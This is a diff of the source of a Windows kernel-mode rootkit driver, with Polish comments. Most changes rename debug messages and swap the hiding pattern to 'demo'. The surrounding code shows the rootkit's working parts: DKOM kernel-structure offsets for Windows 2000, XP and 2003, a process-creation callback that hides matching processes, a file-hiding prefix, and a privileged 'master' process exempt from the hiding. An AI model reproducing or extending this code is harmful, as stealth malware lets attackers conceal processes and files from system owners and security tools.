@@ -67,16 +67,13 @@ VOID ProcessNotify(
   		  if (processName!= NULL) {
     		  if (strlen(processName) >= len) {
                   if (RtlCompareMemory( processName, rulingProcess, len ) == len) {
-    //                DbgPrint("OnProcessHide\n");
+                    DbgPrint("rootkit: Chowam proces: %ld\n",hProcessId);
                     OnProcessHide( (ULONG)hProcessId );                     
                   }
               }
           }
        }
-       DbgPrint("On process create PID=%ld\n",hProcessId);
     }
-    else
-       DbgPrint("On process destroy PID=%ld\n",hProcessId); 
         
     return;    
 }
@@ -90,7 +87,7 @@ VOID ProcessNotify(
 NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	DbgPrint("ROOTKIT: OnDriverCreate\n");
+	DbgPrint("rootkit: OnDriverCreate\n");
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -107,7 +104,7 @@ NTSTATUS OnDriverCreate( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 NTSTATUS OnDriverClose( IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp )
 {
 	NTSTATUS status = STATUS_SUCCESS;
-	DbgPrint("ROOTKIT: OnDriverClose");
+	DbgPrint("rootkit: OnDriverClose");
 
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = 0;
@@ -209,6 +206,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
     ULONG procNameOffset;
 
 	DbgPrint("rootkit: Wszedlem w DriverEntry: %x\n",driverObject);
+	DbgPrint("rootkit: Demo version ,please register :P\n");
 
 	driverObject->DriverUnload  = OnUnload;
 
@@ -256,8 +254,8 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	}	
 	
 	// ciag ktory zawiera wzor do ukrycia, wersja ANSI
-	strcpy( hidePrefixA , "rootkit");
-	DbgPrint( "hidePrefixA %s\n",hidePrefixA);
+	strcpy( hidePrefixA , "demo");
+	DbgPrint( "rootkit: HIDE PATTERN %s\n",hidePrefixA);
 
 	rulingProcess = ExAllocatePool( NonPagedPool, 20);
 	if (rulingProcess == NULL) {
@@ -265,10 +263,10 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	}	
 	// proces rozpoczynajacy sie od tej nazwy bedzie widzial ukryte pliki
 	strcpy( rulingProcess , "master");
-	DbgPrint( "RulingProcess: %s\n",rulingProcess);
+	DbgPrint( "rootkit: RULING PROCESS: %s\n",rulingProcess);
 
 	// ciag ktory zawiera wzor do ukrycia, wersja UNICODE   
-	RtlInitUnicodeString( &hidePrefixW, L"rootkit");	
+	RtlInitUnicodeString( &hidePrefixW, L"demo");
 
 	gp_DeviceObject = driverObject->DeviceObject;
 
@@ -278,7 +276,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 
     // rozpoznanie oraz ustawienie offset waznych dla dzialania technik DKOM
 	if ( SetupOffsets( procNameOffset ) == FALSE ) {
-		DbgPrint("System nie wspierany!");
+		DbgPrint("rootkit: System nie wspierany!");
 		return STATUS_UNSUCCESSFUL;
 	}
 
@@ -290,7 +288,7 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 	
 	PsSetCreateProcessNotifyRoutine( ProcessNotify , FALSE );
 
-	DbgPrint("DriverEntry leaved\n");
+	DbgPrint("rootkit: wyjscie z DriverEntry\n");
 	return status;
 }
 
@@ -309,19 +307,19 @@ BOOLEAN SetupOffsets(ULONG processNameOffset)
 	switch (BuildNumber)
 	{
 	case 2195:
-   		DbgPrint("Wykryto instalacje Windows 2000\n");
+   		DbgPrint("rootkit: Wykryto instalacje Windows 2000\n");
 		offsets    = WIN2K_OFFS;
 		currentAPI = API_2K; 
 		break;
 
 	case 2600:
-   		DbgPrint("Wykryto instalacje Windows XP\n");
+   		DbgPrint("rootkit: Wykryto instalacje Windows XP\n");
 		offsets = WINXP_OFFS;
 		currentAPI = API_XP; 		
 		break;
 
 	case 3790:		
-   		DbgPrint("Wykryto instalacje Windows 2003 Server\n");
+   		DbgPrint("rootkit: Wykryto instalacje Windows 2003 Server\n");
 		offsets = WIN2K3_OFFS;
 		currentAPI = API_2K3; 		
 		break;
